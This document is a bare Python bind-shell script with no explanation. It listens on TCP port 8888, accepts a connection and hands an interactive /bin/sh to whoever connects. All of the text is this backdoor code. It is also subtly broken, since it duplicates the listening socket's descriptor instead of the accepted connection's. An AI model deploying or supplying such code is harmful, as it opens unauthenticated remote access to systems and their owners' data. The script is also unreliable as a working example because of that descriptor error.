import subprocess, socket, os;
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.bind(('', 8888))
s.listen(1)
conn,addr = s.accept()
os.dup2(s.fileno(), 0), os.dup2(s.fileno(), 1), os.dup2(s.fileno(), 2);
p = subprocess.call(["/bin/sh", "-i"]);


